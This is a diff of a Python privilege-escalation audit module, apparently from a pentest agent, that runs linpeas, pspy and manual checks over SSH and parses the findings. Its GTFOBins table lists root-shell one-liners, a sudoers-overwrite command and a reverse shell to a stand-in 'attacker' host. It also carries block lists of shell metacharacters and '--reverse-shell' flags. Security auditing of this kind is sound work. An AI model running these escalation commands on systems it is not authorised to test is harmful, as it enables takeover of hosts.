@@ -1,193 +1,95 @@
-import subprocess
+#/+
+import ipaddress
 import json
-import re
-import time
 import os
-from typing import Optional, Any
+import re
+import socket
+import subprocess
+import sys
+import time
+from typing import Any, Optional
+import uuid
+
+import paramiko
 from pydantic import BaseModel, Field, field_validator
 
+from server.agents.executer.recon.config import BLOCKED_HOSTNAMES as _BLOCKED_HOSTNAMES
+from server.agents.executer.recon.config import BLOCKED_NETWORKS as _BLOCKED_NETWORKS
 
 # ══════════════════════════════════════════════════════════════
-# 1. SCHEMAS
+# 1. CONSTANTS
 # ══════════════════════════════════════════════════════════════
 
-class PrivescAuditRequest(BaseModel):
-    tool: str
-    mode: str
-    args: list[str] = []
-    timeout: int = Field(default=300, ge=30, le=3600)
+_ALLOWED_TOOLS = frozenset({"linpeas", "linux-exploit-suggester", "pspy", "manual"})
+_ALLOWED_MODES = frozenset({
+    "full_audit",
+    "suid_sgid", "sudo_misconfig", "cron_jobs", "writable_paths",
+    "capabilities", "kernel_exploits", "docker_lxc", "network_info", "password_files",
+    "les_kernel", "les_extended",
+    "pspy_procs", "pspy_cron",
+    "manual_suid", "manual_caps", "manual_writable", "manual_cron",
+    "manual_sudo", "manual_docker", "manual_env",
+})
+_DANGEROUS     = frozenset({";", "&&", "||", "|", "`", "$(", ">>", "'", '"', "\n", "\r"})
+_BLOCKED_FLAGS = frozenset({"--upload", "--reverse-shell", "--exploit"})
 
-    @field_validator("tool")
-    @classmethod
-    def validate_tool(cls, v):
-        allowed = {"linpeas", "linux-exploit-suggester", "pspy", "manual"}
-        if v not in allowed:
-            raise ValueError(f"Tool '{v}' not allowed. Use: {allowed}")
-        return v
+_RAW_LIMIT = 8_000
+_ERR_LIMIT = 1_000
 
-    @field_validator("mode")
-    @classmethod
-    def validate_mode(cls, v):
-        allowed_modes = {
-            # linpeas modes
-            "full_audit",           # full linpeas run — all checks
-            "suid_sgid",            # SUID/SGID binaries
-            "sudo_misconfig",       # sudo -l + sudoers misconfigs
-            "cron_jobs",            # cron jobs + writable cron paths
-            "writable_paths",       # world-writable files/dirs/scripts
-            "capabilities",         # linux capabilities (cap_setuid etc.)
-            "kernel_exploits",      # kernel version → CVE suggestions
-            "docker_lxc",           # docker group, lxc, container escape
-            "network_info",         # interfaces, open ports, hosts
-            "password_files",       # /etc/passwd, shadow, .ssh, history
-            # linux-exploit-suggester modes
-            "les_kernel",           # kernel CVE matching
-            "les_extended",         # extended userspace checks
-            # pspy modes
-            "pspy_procs",           # passive process spy (no root needed)
-            "pspy_cron",            # spy specifically for cron triggers
-            # manual audit modes (built-in, no external tool)
-            "manual_suid",          # find / -perm -4000 (manual)
-            "manual_caps",          # getcap -r / (manual)
-            "manual_writable",      # find / -writable (manual)
-            "manual_cron",          # cat all crontabs (manual)
-            "manual_sudo",          # sudo -l (manual)
-            "manual_docker",        # id + docker group check (manual)
-            "manual_env",           # env + path hijack candidates
-        }
-        if v not in allowed_modes:
-            raise ValueError(f"Mode '{v}' not allowed. Use: {allowed_modes}")
-        return v
+_LINPEAS_BIN = "/tmp/linpeas.sh"
+_LES_BIN     = "/tmp/linux-exploit-suggester.sh"
+_PSPY_BIN    = "/tmp/pspy64"
 
-    @field_validator("args")
-    @classmethod
-    def validate_args(cls, v):
-        """Block shell injection ONLY — preserve all tool features"""
-        dangerous_chars = [";", "&&", "||", "|", "`", "$(", ">>", "'", '"']
-        blocked_flags   = ["--upload", "--reverse-shell", "--exploit"]  # no auto-exploitation
+_LINPEAS_SECTION: dict[str, str] = {
+    "suid_sgid":      "SuidBins",
+    "sudo_misconfig": "Sudo",
+    "cron_jobs":      "CronJobs",
+    "writable_paths": "WritableFiles",
+    "capabilities":   "Capabilities",
+    "kernel_exploits":"KernelExploits",
+    "docker_lxc":     "DockerFiles",
+    "network_info":   "NetInfo",
+    "password_files": "PasswordsFiles",
+}
 
-        for arg in v:
-            for char in dangerous_chars:
-                if char in arg:
-                    raise ValueError(f"Dangerous character '{char}' in: {arg}")
-            for flag in blocked_flags:
-                if arg.strip() == flag:
-                    raise ValueError(f"Blocked flag: {arg}")
-        return v
+# Manual mode → command (no shell=True, no shell meta-chars)
+_MANUAL_CMDS: dict[str, list[str]] = {
+    "manual_suid":    ["find", "/", "-perm", "-4000", "-type", "f", "-ls"],
+    "manual_caps":    ["getcap", "-r", "/"],
+    "manual_writable":["find", "/", "-writable",
+                       "-not", "-path", "*/proc/*",
+                       "-not", "-path", "*/sys/*"],
+    "manual_cron":    ["cat", "/etc/crontab"],
+    "manual_sudo":    ["sudo", "-l"],
+    "manual_docker":  ["id"],
+    "manual_env":     ["env"],
+}
 
-
-# ── SUID / SGID Binary ──
-class SUIDResult(BaseModel):
-    path: str
-    permissions: Optional[str] = None
-    owner: Optional[str] = None
-    group: Optional[str] = None
-    gtfobins: Optional[bool] = None        # known GTFOBins entry
-    exploit_note: Optional[str] = None
-
-
-# ── Sudo Rule ──
-class SudoResult(BaseModel):
-    user: Optional[str] = None
-    host: Optional[str] = None
-    runas: Optional[str] = None
-    command: str
-    nopasswd: bool = False
-    gtfobins: Optional[bool] = None
-    exploit_note: Optional[str] = None
-
-
-# ── Cron Job ──
-class CronResult(BaseModel):
-    schedule: Optional[str] = None
-    user: Optional[str] = None
-    command: str
-    source: Optional[str] = None          # /etc/crontab, /var/spool/cron/*, cron.d/*
-    writable: Optional[bool] = None       # can we write to this script?
-    exploit_note: Optional[str] = None
-
-
-# ── Writable Path ──
-class WritableResult(BaseModel):
-    path: str
-    permissions: Optional[str] = None
-    owner: Optional[str] = None
-    path_type: Optional[str] = None       # file, dir, script, suid_dir
-    exploit_note: Optional[str] = None
-
-
-# ── Linux Capability ──
-class CapabilityResult(BaseModel):
-    path: str
-    capabilities: str
-    exploit_note: Optional[str] = None
-
-
-# ── Kernel Exploit Suggestion ──
-class KernelExploitResult(BaseModel):
-    cve: Optional[str] = None
-    name: Optional[str] = None
-    severity: Optional[str] = None
-    kernel_version: Optional[str] = None
-    url: Optional[str] = None
-    notes: Optional[str] = None
-
-
-# ── Docker / Container Finding ──
-class ContainerResult(BaseModel):
-    finding: str
-    detail: Optional[str] = None
-    exploit_note: Optional[str] = None
-
-
-# ── Process Spy Entry (pspy) ──
-class ProcessResult(BaseModel):
-    uid: Optional[str] = None
-    pid: Optional[str] = None
-    command: str
-    timestamp: Optional[str] = None
-    triggered_by: Optional[str] = None    # cron, user, daemon
-
-
-# ── Final Result ──
-class PrivescAuditResult(BaseModel):
-    success: bool
-    tool: str
-    mode: str
-    command: str
-    hostname: Optional[str] = None
-    kernel_version: Optional[str] = None
-    current_user: Optional[str] = None
-    suid_bins: list[SUIDResult] = []
-    sudo_rules: list[SudoResult] = []
-    cron_jobs: list[CronResult] = []
-    writable_paths: list[WritableResult] = []
-    capabilities: list[CapabilityResult] = []
-    kernel_exploits: list[KernelExploitResult] = []
-    container_findings: list[ContainerResult] = []
-    processes: list[ProcessResult] = []
-    raw_output: Optional[str] = None
-    error: Optional[str] = None
-    execution_time: float = 0.0
+_ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
 
 
 # ══════════════════════════════════════════════════════════════
-# 2. GTFOBINS REFERENCE  (offline — no network needed)
+# 2. GTFOBINS + CAPABILITIES  (offline, no network)
 # ══════════════════════════════════════════════════════════════
 
-# Common GTFOBins with privesc notes
+# Duplicate keys removed — last value wins in plain dicts, so we use unique keys
 GTFOBINS: dict[str, str] = {
-    "bash":       "sudo bash → root shell",
+    "bash":       "SUID/sudo bash → /bin/bash -p  or  sudo bash → root shell",
+    "dash":       "SUID dash: /bin/dash -p → root",
     "sh":         "sudo sh → root shell",
+    "zsh":        "SUID zsh → root shell",
+    "ksh":        "SUID ksh → root shell",
+    "csh":        "SUID csh → root shell",
+    "tcsh":       "SUID tcsh → root shell",
     "python":     "sudo python -c 'import os; os.system(\"/bin/sh\")'",
     "python2":    "sudo python2 -c 'import os; os.system(\"/bin/sh\")'",
-    "python3":    "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+    "python3":    "sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
     "perl":       "sudo perl -e 'exec \"/bin/sh\";'",
     "ruby":       "sudo ruby -e 'exec \"/bin/sh\"'",
     "php":        "sudo php -r 'system(\"/bin/sh\");'",
     "lua":        "sudo lua -e 'os.execute(\"/bin/sh\")'",
     "awk":        "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
-    "nmap":       "sudo nmap --interactive → !sh  (older versions)",
+    "nmap":       "sudo nmap --interactive → !sh  (versions < 5.21)",
     "vim":        "sudo vim -c ':!/bin/sh'",
     "vi":         "sudo vi -c ':!/bin/sh'",
     "nano":       "sudo nano → ^R^X → reset; sh 1>&0 2>&0",
@@ -198,26 +100,22 @@ GTFOBINS: dict[str, str] = {
     "tee":        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned",
     "cp":         "sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash",
     "mv":         "overwrite sensitive files (e.g. /etc/passwd)",
-    "cat":        "read /etc/shadow via SUID cat",
-    "tail":       "read /etc/shadow via SUID tail",
-    "head":       "read /etc/shadow via SUID head",
-    "cut":        "read /etc/shadow via SUID cut",
-    "sort":       "read /etc/shadow via SUID sort",
+    "cat":        "SUID cat → read /etc/shadow",
+    "tail":       "SUID tail → read /etc/shadow",
+    "head":       "SUID head → read /etc/shadow",
     "base64":     "base64 /etc/shadow | base64 --decode",
     "xxd":        "xxd /etc/shadow | xxd -r",
     "tar":        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
     "zip":        "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/sh'",
-    "unzip":      "sudo unzip -K /tmp/x.zip -d /tmp/",
     "curl":       "sudo curl file:///etc/shadow",
     "wget":       "sudo wget file:///etc/shadow",
     "ftp":        "sudo ftp → ! /bin/sh",
     "ssh":        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
     "git":        "sudo git -p help → !sh",
     "gcc":        "sudo gcc -wrapper /bin/sh,-s",
-    "make":       "sudo make -s --eval=$'x:\\n\\t-'\"'\"'exec /bin/sh'\"'\"",
+    "make":       "sudo make -s --eval=$'x:\\n\\t-'exec /bin/sh",
     "env":        "sudo env /bin/sh",
     "strace":     "sudo strace -o /dev/null /bin/sh",
-    "ltrace":     "sudo ltrace -b -L /bin/sh",
     "time":       "sudo time /bin/sh",
     "watch":      "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
     "taskset":    "sudo taskset 1 /bin/sh",
@@ -227,12 +125,10 @@ GTFOBINS: dict[str, str] = {
     "systemctl":  "sudo systemctl → write unit file → ExecStart=/bin/bash",
     "journalctl": "sudo journalctl → !sh",
     "mount":      "sudo mount -o bind /bin/bash /bin/sh",
-    "umount":     "sudo umount -l /mnt → triggers unmount hooks",
     "chmod":      "sudo chmod +s /bin/bash → /bin/bash -p",
     "chown":      "sudo chown root:root /bin/bash && chmod +s /bin/bash",
     "dd":         "sudo dd if=/etc/shadow",
     "od":         "od -c /etc/shadow",
-    "hexdump":    "hexdump -C /etc/shadow",
     "screen":     "sudo screen -x root/",
     "tmux":       "sudo tmux -S /tmp/s new-session -d; sudo tmux -S /tmp/s",
     "socat":      "sudo socat stdin exec:/bin/sh",
@@ -241,161 +137,385 @@ GTFOBINS: dict[str, str] = {
     "ncat":       "sudo ncat -e /bin/sh attacker 4444",
     "docker":     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
     "lxc":        "lxc init ubuntu:16.04 privesc -c security.privileged=true",
-    "newgrp":     "sudo newgrp root",
-    "su":         "sudo su → root",
-    "passwd":     "SUID passwd → overwrite /etc/passwd",
-    "pkexec":     "CVE-2021-4034 (Pwnkit) — affects all polkit versions < 0.120",
+    "pkexec":     "CVE-2021-4034 (Pwnkit) — affects polkit < 0.120",
     "node":       "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
     "npm":        "sudo npm run env --",
     "pip":        "sudo pip install --upgrade . (malicious setup.py)",
     "pip3":       "sudo pip3 install --upgrade . (malicious setup.py)",
-    "ruby":       "sudo ruby -e 'exec \"/bin/sh\"'",
-    "irb":        "sudo irb → exec '/bin/sh'",
-    "knife":      "sudo knife exec -E 'exec \"/bin/sh\"'",
     "mysql":      "sudo mysql -e '\\! /bin/sh'",
     "sqlite3":    "sudo sqlite3 /dev/null '.shell /bin/sh'",
     "psql":       "sudo psql -c '\\! /bin/sh'",
-    "tclsh":      "sudo tclsh → exec /bin/sh",
-    "expect":     "sudo expect -c 'spawn /bin/sh;interact'",
-    "capsh":      "sudo capsh --print",
-    "openssl":    "sudo openssl req -newkey rsa:4096 -subj / -passout pass: -out /dev/null 2>&1",
+    "openssl":    "sudo openssl enc -in /etc/shadow",
     "rsync":      "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
-    "scp":        "sudo scp -S /tmp/evil.sh x y:",
     "xargs":      "sudo xargs -a /dev/null sh",
-    "tee":        "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers",
-    "bash":       "SUID bash: /bin/bash -p → root",
-    "dash":       "SUID dash: /bin/dash -p → root",
-    "zsh":        "SUID zsh: /bin/zsh → root",
-    "ksh":        "SUID ksh → root shell",
-    "csh":        "SUID csh → root shell",
-    "tcsh":       "SUID tcsh → root shell",
+    "passwd":     "SUID passwd → overwrite /etc/passwd",
+    "su":         "sudo su → root",
+    "capsh":      "sudo capsh --gid=0 --uid=0 --",
+    "expect":     "sudo expect -c 'spawn /bin/sh;interact'",
+    "tclsh":      "sudo tclsh → exec /bin/sh",
+    "irb":        "sudo irb → exec '/bin/sh'",
+    "knife":      "sudo knife exec -E 'exec \"/bin/sh\"'",
 }
 
-# Capability → privesc mapping
 DANGEROUS_CAPS: dict[str, str] = {
-    "cap_setuid":     "Set UID to 0 → instant root (e.g. python3 cap_setuid → os.setuid(0))",
-    "cap_setgid":     "Set GID to 0 → root group",
-    "cap_sys_admin":  "Broad admin capability — mount, ioctl, container escape",
-    "cap_sys_ptrace": "ptrace any process → inject shellcode into root process",
-    "cap_dac_override": "Bypass DAC — read/write any file (e.g. /etc/shadow)",
-    "cap_dac_read_search": "Read any file/dir → read /etc/shadow",
-    "cap_chown":      "chown any file → chown /etc/shadow",
-    "cap_fowner":     "Bypass owner permission checks",
-    "cap_net_raw":    "Raw sockets → ARP/ICMP spoofing",
-    "cap_net_bind_service": "Bind ports < 1024",
-    "cap_sys_rawio":  "Raw I/O — read kernel memory",
-    "cap_sys_module": "Load kernel modules → rootkit",
-    "cap_audit_write": "Write audit log → log tampering",
-    "cap_kill":       "Send signals to any process",
-    "cap_mknod":      "Create device files",
-    "cap_sys_chroot": "chroot to arbitrary path",
-    "cap_sys_boot":   "Reboot / load new kernel",
-    "cap_ipc_lock":   "Lock memory pages",
-    "cap_linux_immutable": "Set/clear immutable flag",
+    "cap_setuid":          "Set UID=0 → instant root",
+    "cap_setgid":          "Set GID=0 → root group",
+    "cap_sys_admin":       "Broad admin: mount, ioctl, container escape",
+    "cap_sys_ptrace":      "ptrace any process → inject shellcode into root process",
+    "cap_dac_override":    "Bypass DAC — read/write any file including /etc/shadow",
+    "cap_dac_read_search": "Read any file/dir → /etc/shadow",
+    "cap_chown":           "chown any file → chown /etc/shadow",
+    "cap_fowner":          "Bypass owner permission checks",
+    "cap_net_raw":         "Raw sockets → ARP/ICMP spoofing",
+    "cap_sys_rawio":       "Raw I/O → read kernel memory",
+    "cap_sys_module":      "Load kernel modules → rootkit",
+    "cap_sys_chroot":      "chroot to arbitrary path",
+    "cap_kill":            "Send signals to any process",
+    "cap_mknod":           "Create device files",
 }
 
 
-def check_gtfobins(binary_name: str) -> tuple[bool, Optional[str]]:
-    name = os.path.basename(binary_name).lower()
-    if name in GTFOBINS:
-        return True, GTFOBINS[name]
-    return False, None
+def _check_gtfobins(binary_path: str) -> tuple[bool, Optional[str]]:
+    name = os.path.basename(binary_path).lower()
+    note = GTFOBINS.get(name)
+    return (True, note) if note else (False, None)
 
 
-def check_caps(cap_string: str) -> Optional[str]:
-    notes = []
-    for cap, note in DANGEROUS_CAPS.items():
-        if cap in cap_string.lower():
-            notes.append(f"{cap}: {note}")
+def _check_caps(cap_string: str) -> Optional[str]:
+    notes = [f"{cap}: {note}" for cap, note in DANGEROUS_CAPS.items()
+             if cap in cap_string.lower()]
     return " | ".join(notes) if notes else None
 
 
+def _strip_ansi(text: str) -> str:
+    return _ANSI_RE.sub("", text)
+
+
 # ══════════════════════════════════════════════════════════════
-# 3. PARSERS
+# 3. SCHEMAS
 # ══════════════════════════════════════════════════════════════
 
-def parse_linpeas(stdout: str) -> PrivescAuditResult:
-    """
-    Parse linpeas.sh output.
+class PrivescAuditRequest(BaseModel):
+    tool:    str
+    mode:    str
+    target:  Optional[str] = None
+    username:Optional[str] = None
+    password:Optional[str] = None
+    key_path:Optional[str] = None
+    args:    list[str] = []
+    timeout: int       = Field(default=300, ge=10, le=3600)
 
-    linpeas uses ANSI color codes for severity:
-      RED/YELLOW  = high interest
-      GREEN       = interesting
-      Plain text  = informational
+    @field_validator("target")
+    @classmethod
+    def validate_target(cls, v: Optional[str]) -> Optional[str]:
+        if not v:
+            return v
+        v = v.strip()
+        if not v:
+            return None
+        v_lower = v.lower()
+        for b_host in _BLOCKED_HOSTNAMES:
+            if v_lower == b_host or v_lower.endswith(f".{b_host}"):
+                raise ValueError(f"Target '{v}' matches blocked hostname '{b_host}'")
+        try:
+            ip = ipaddress.ip_address(v)
+            for net in _BLOCKED_NETWORKS:
+                if ip in net:
+                    raise ValueError(f"Target '{v}' is in a blocked range ({net})")
+        except ValueError as exc:
+            if "blocked range" in str(exc):
+                raise
+        return v
 
-    We strip ANSI and extract sections by header markers.
-    """
-    # Strip ANSI escape codes
-    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
-    clean = ansi_escape.sub("", stdout)
+    @field_validator("username", "password", "key_path", mode="before")
+    @classmethod
+    def validate_creds(cls, v: Optional[str]) -> Optional[str]:
+        if not v:
+            return v
+        for ch in _DANGEROUS:
+            if ch in v:
+                raise ValueError(f"Dangerous character {ch!r} in parameter")
+        return v
 
-    result = PrivescAuditResult(
-        success=True, tool="linpeas", mode="", command=""
-    )
+    @field_validator("tool")
+    @classmethod
+    def validate_tool(cls, v: str) -> str:
+        if v not in _ALLOWED_TOOLS:
+            raise ValueError(f"tool must be one of: {sorted(_ALLOWED_TOOLS)}")
+        return v
 
-    # ── Kernel / host info ──
-    kernel_match = re.search(r"Linux version\s+(\S+)", clean)
-    if kernel_match:
-        result.kernel_version = kernel_match.group(1)
+    @field_validator("mode")
+    @classmethod
+    def validate_mode(cls, v: str) -> str:
+        if v not in _ALLOWED_MODES:
+            raise ValueError(f"mode must be one of: {sorted(_ALLOWED_MODES)}")
+        return v
 
-    host_match = re.search(r"Hostname:\s*(\S+)", clean, re.IGNORECASE)
-    if host_match:
-        result.hostname = host_match.group(1)
+    @field_validator("args", mode="before")
+    @classmethod
+    def validate_args(cls, v: list[str]) -> list[str]:
+        for arg in v:
+            for ch in _DANGEROUS:
+                if ch in arg:
+                    raise ValueError(f"Dangerous character {ch!r} in arg: {arg!r}")
+            if arg.strip() in _BLOCKED_FLAGS:
+                raise ValueError(f"Blocked flag: {arg!r}")
+        return v
 
-    user_match = re.search(r"Current user:\s*(\S+)", clean, re.IGNORECASE)
-    if not user_match:
-        user_match = re.search(r"whoami.*?\n(\S+)", clean)
-    if user_match:
-        result.current_user = user_match.group(1)
 
-    # ── SUID / SGID ──
-    suid_section = re.search(
+class SUIDResult(BaseModel):
+    path:         str
+    permissions:  Optional[str] = None
+    owner:        Optional[str] = None
+    group:        Optional[str] = None
+    gtfobins:     Optional[bool] = None
+    exploit_note: Optional[str] = None
+
+
+class SudoResult(BaseModel):
+    runas:        Optional[str] = None
+    command:      str
+    nopasswd:     bool          = False
+    gtfobins:     Optional[bool] = None
+    exploit_note: Optional[str] = None
+
+
+class CronResult(BaseModel):
+    schedule:     Optional[str] = None
+    user:         Optional[str] = None
+    command:      str
+    source:       Optional[str] = None
+    writable:     Optional[bool] = None
+    exploit_note: Optional[str] = None
+
+
+class WritableResult(BaseModel):
+    path:         str
+    permissions:  Optional[str] = None
+    owner:        Optional[str] = None
+    path_type:    Optional[str] = None
+    exploit_note: Optional[str] = None
+
+
+class CapabilityResult(BaseModel):
+    path:         str
+    capabilities: str
+    exploit_note: Optional[str] = None
+
+
+class KernelExploitResult(BaseModel):
+    cve:            Optional[str] = None
+    name:           Optional[str] = None
+    severity:       Optional[str] = None
+    kernel_version: Optional[str] = None
+    url:            Optional[str] = None
+    notes:          Optional[str] = None
+
+
+class ContainerResult(BaseModel):
+    finding:      str
+    detail:       Optional[str] = None
+    exploit_note: Optional[str] = None
+
+
+class ProcessResult(BaseModel):
+    uid:          Optional[str] = None
+    pid:          Optional[str] = None
+    command:      str
+    timestamp:    Optional[str] = None
+    triggered_by: Optional[str] = None
+
+
+class PrivescAuditResult(BaseModel):
+    success:            bool
+    tool:               str
+    mode:               str
+    command:            str
+    hostname:           Optional[str]           = None
+    kernel_version:     Optional[str]           = None
+    current_user:       Optional[str]           = None
+    suid_bins:          list[SUIDResult]         = []
+    sudo_rules:         list[SudoResult]         = []
+    cron_jobs:          list[CronResult]         = []
+    writable_paths:     list[WritableResult]     = []
+    capabilities:       list[CapabilityResult]   = []
+    kernel_exploits:    list[KernelExploitResult] = []
+    container_findings: list[ContainerResult]    = []
+    processes:          list[ProcessResult]      = []
+    raw_output:         Optional[str]            = None
+    error:              Optional[str]            = None
+    execution_time:     float                    = 0.0
+
+
+# ══════════════════════════════════════════════════════════════
+# 4. EXECUTOR
+# ══════════════════════════════════════════════════════════════
+
+def _ssh_execute(req: PrivescAuditRequest, cmd_list: list[str]) -> tuple[str, str, int]:
+    """Execute via Paramiko natively over SSH."""
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    # 1. Connect
+    try:
+        client.connect(
+            hostname=req.target,
+            username=req.username,
+            password=req.password,
+            key_filename=req.key_path,
+            timeout=10,
+        )
+    except Exception as e:
+        return "", f"SSH Connection failed: {e}", -1
+
+    try:
+        # 2. Logic router for memory staging
+        if req.tool in ("linpeas", "linux-exploit-suggester"):
+            # Stream script directly into bash via stdin
+            local_bin = _LINPEAS_BIN if req.tool == "linpeas" else _LES_BIN
+            base_cmd = " ".join(cmd_list[2:])  # remove 'bash /tmp/...sh'
+            ssh_cmd = f"bash -s -- {base_cmd}"
+            try:
+                with open(local_bin, "r") as f:
+                    script_data = f.read()
+            except IOError:
+                return "", f"Local script {local_bin} not found to upload", 127
+                
+            stdin, stdout, stderr = client.exec_command(ssh_cmd, timeout=req.timeout)
+            stdin.write(script_data)
+            stdin.channel.shutdown_write()
+            
+            out = stdout.read().decode(errors="replace")
+            err = stderr.read().decode(errors="replace")
+            return out, err, stdout.channel.recv_exit_status()
+            
+        elif req.tool == "pspy":
+            # Pspy is compiled. Must drop to disk via SFTP.
+            remote_bin = f"/tmp/.p_{uuid.uuid4().hex[:6]}"
+            try:
+                sftp = client.open_sftp()
+                sftp.put(_PSPY_BIN, remote_bin)
+                sftp.chmod(remote_bin, 0o755)
+                sftp.close()
+            except Exception as e:
+                return "", f"SFTP upload failed for pspy: {e}", -1
+            
+            ssh_cmd = " ".join([remote_bin] + cmd_list[1:])
+            try:
+                stdin, stdout, stderr = client.exec_command(ssh_cmd, timeout=req.timeout)
+                out = stdout.read().decode(errors="replace")
+                err = stderr.read().decode(errors="replace")
+                rc = stdout.channel.recv_exit_status()
+            finally:
+                # Always rip it off disk
+                client.exec_command(f"rm -f {remote_bin}")
+                
+            return out, err, rc
+            
+        else:
+            # Manual mode (or standard commands) directly execute over SSH channel
+            ssh_cmd = " ".join(cmd_list)
+            stdin, stdout, stderr = client.exec_command(ssh_cmd, timeout=req.timeout)
+            out = stdout.read().decode(errors="replace")
+            err = stderr.read().decode(errors="replace")
+            return out, err, stdout.channel.recv_exit_status()
+            
+    except Exception as e:
+        return "", f"SSH Execution error: {e}", -1
+    finally:
+        client.close()
+
+
+def _safe_execute(cmd: list[str], timeout: int) -> tuple[str, str, int]:
+    try:
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            shell=False,
+        )
+        try:
+            stdout, stderr = proc.communicate(timeout=timeout)
+            return stdout, stderr, proc.returncode
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            stdout, stderr = proc.communicate()
+            return (
+                stdout or "",
+                (stderr or "") + f"\n[timeout] killed after {timeout}s",
+                -1,
+            )
+    except FileNotFoundError:
+        return "", f"Tool '{cmd[0]}' not installed or not found at path", 127
+    except Exception as exc:
+        return "", str(exc), -1
+
+
+# ══════════════════════════════════════════════════════════════
+# 5. PARSERS
+# ══════════════════════════════════════════════════════════════
+
+def _parse_linpeas(stdout: str, mode: str, command: str) -> PrivescAuditResult:
+    clean = _strip_ansi(stdout)
+    result = PrivescAuditResult(success=True, tool="linpeas", mode=mode, command=command)
+
+    # ── System info ──────────────────────────────────────────
+    m = re.search(r"Linux version\s+(\S+)", clean)
+    if m:
+        result.kernel_version = m.group(1)
+
+    m = re.search(r"Hostname:\s*(\S+)", clean, re.IGNORECASE)
+    if m:
+        result.hostname = m.group(1)
+
+    m = re.search(r"Current user:\s*(\S+)", clean, re.IGNORECASE)
+    if m:
+        result.current_user = m.group(1)
+
+    # ── SUID/SGID ────────────────────────────────────────────
+    suid_sec = re.search(
         r"SUID.*?binaries(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
     )
-    if suid_section:
-        for m in re.finditer(r"(/\S+)", suid_section.group(1)):
+    seen_suid: set[str] = set()
+    if suid_sec:
+        for m in re.finditer(r"(/\S+)", suid_sec.group(1)):
             path = m.group(1)
-            gtf, note = check_gtfobins(path)
-            result.suid_bins.append(SUIDResult(
-                path=path,
-                gtfobins=gtf,
-                exploit_note=note,
-            ))
+            if path not in seen_suid:
+                seen_suid.add(path)
+                gtf, note = _check_gtfobins(path)
+                result.suid_bins.append(SUIDResult(path=path, gtfobins=gtf, exploit_note=note))
 
-    # Fallback: find -perm -4000 style lines
+    # Fallback: -rws permission lines
     for m in re.finditer(r"-rws\S*\s+\S+\s+\S+\s+(/\S+)", clean):
         path = m.group(1)
-        if not any(s.path == path for s in result.suid_bins):
-            gtf, note = check_gtfobins(path)
+        if path not in seen_suid:
+            seen_suid.add(path)
+            gtf, note = _check_gtfobins(path)
             result.suid_bins.append(SUIDResult(path=path, gtfobins=gtf, exploit_note=note))
 
-    # ── Sudo rules ──
-    sudo_section = re.search(
-        r"Sudo version.*?sudo -l(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
+    # ── Sudo rules ───────────────────────────────────────────
+    sudo_sec = re.search(
+        r"sudo -l(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
     )
-    raw_sudo = sudo_section.group(1) if sudo_section else clean
-    for m in re.finditer(
-        r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw_sudo
-    ):
-        cmd = m.group(3).strip()
+    raw_sudo = sudo_sec.group(1) if sudo_sec else clean
+    for m in re.finditer(r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw_sudo):
+        cmd_str  = m.group(3).strip()
         nopasswd = bool(m.group(2))
-        gtf, note = check_gtfobins(cmd)
+        gtf, note = _check_gtfobins(cmd_str)
         result.sudo_rules.append(SudoResult(
-            runas=m.group(1),
-            command=cmd,
-            nopasswd=nopasswd,
-            gtfobins=gtf,
-            exploit_note=note,
+            runas=m.group(1), command=cmd_str,
+            nopasswd=nopasswd, gtfobins=gtf, exploit_note=note,
         ))
 
-    # ── Cron jobs ──
-    cron_section = re.search(
+    # ── Cron jobs ────────────────────────────────────────────
+    cron_sec = re.search(
         r"Cron jobs(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
     )
-    if cron_section:
+    if cron_sec:
         for m in re.finditer(
             r"(\*[/\d\*\s,\-]+|@\w+)\s+(\w+)\s+(/.+?)(?:\n|$)",
-            cron_section.group(1)
+            cron_sec.group(1),
         ):
             result.cron_jobs.append(CronResult(
                 schedule=m.group(1).strip(),
@@ -403,31 +523,28 @@ def parse_linpeas(stdout: str) -> PrivescAuditResult:
                 command=m.group(3).strip(),
             ))
 
-    # ── Writable paths ──
-    writable_section = re.search(
+    # ── Writable paths ───────────────────────────────────────
+    writable_sec = re.search(
         r"Writable.*?files(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
     )
-    if writable_section:
-        for m in re.finditer(r"(/\S+)", writable_section.group(1)):
+    if writable_sec:
+        for m in re.finditer(r"(/\S+)", writable_sec.group(1)):
             result.writable_paths.append(WritableResult(path=m.group(1)))
 
-    # ── Capabilities ──
-    cap_section = re.search(
+    # ── Capabilities ─────────────────────────────────────────
+    cap_sec = re.search(
         r"Capabilities(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
     )
-    if cap_section:
-        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", cap_section.group(1)):
-            note = check_caps(m.group(2))
+    if cap_sec:
+        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", cap_sec.group(1)):
+            note = _check_caps(m.group(2))
             result.capabilities.append(CapabilityResult(
-                path=m.group(1),
-                capabilities=m.group(2),
